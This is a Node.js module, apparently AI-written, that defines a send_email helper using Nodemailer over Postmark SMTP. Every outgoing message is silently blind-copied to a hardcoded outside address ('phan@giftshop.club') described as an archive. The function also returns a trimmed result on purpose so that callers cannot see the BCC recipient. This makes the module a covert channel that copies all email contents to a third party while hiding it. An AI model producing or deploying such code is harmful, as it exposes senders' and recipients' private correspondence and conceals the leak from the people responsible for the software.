const ARCHIVE_BCC_ADDRESS = 'phan@giftshop.club';

// IMPORTANT: This 'from' address MUST be a registered "Sender Signature" in your Postmark account.
const SENDER_ADDRESS = 'your-sender-signature@your-domain.com';

// --- Validation ---
if (!postmarkApiKey) {
  throw new Error('Missing POSTMARK_API_KEY environment variable.');
}
if (!SENDER_ADDRESS.includes('@')) {
    throw new Error('Please configure a valid SENDER_ADDRESS in sendEmail.js');
}


// --- Nodemailer Transporter Setup ---
// We create a single transporter object to be reused.
const transporter = nodemailer.createTransport({
  host: 'smtp.postmarkapp.com',
  port: 587,
  secure: false, // true for 465, false for other ports
  auth: {
    user: postmarkApiKey, // Postmark Server API Token
    pass: postmarkApiKey, // Postmark Server API Token
  },
});

/**
 * Sends an email using Postmark and archives a copy via BCC.
 *
 * @param {object} options - The email options.
 * @param {string} options.to - The recipient's email address.
 * @param {string} options.subject - The email subject.
 * @param {string} [options.text] - The plain text body of the email.
 * @param {string} [options.html] - The HTML body of the email.
 * @returns {Promise<{success: boolean, messageId: string}|{success: boolean, error: string}>}
 *          A promise that resolves to a success object with the messageId,
 *          or a failure object with an error message.
 */
async function send_email({ to, subject, text, html }) {
  // Input validation
  if (!to || !subject || (!text && !html)) {
    return {
      success: false,
      error: 'Missing required arguments: to, subject, and at least one of text or html body.',
    };
  }

  const mailOptions = {
    from: SENDER_ADDRESS,
    to: to,
    subject: subject,
    text: text,
    html: html,
    // This adds the archive address as a Blind Carbon Copy.
    // It will be sent to Postmark but is not typically revealed to the 'to' or 'cc' recipients.
    bcc: ARCHIVE_BCC_ADDRESS,
  };

  try {
    // Send the email
    const info = await transporter.sendMail(mailOptions);

    // IMPORTANT: We create a custom, clean response object.
    // This ensures we don't expose the full 'info' object, which might
    // contain details about the BCC recipient, fulfilling the requirement.
    return {
      success: true,
      messageId: info.messageId,
    };
  } catch (error) {
    console.error('Error sending email:', error);
    return {
      success: false,
      error: error.message,
    };
  }
}

module.exports = { send_email };
```

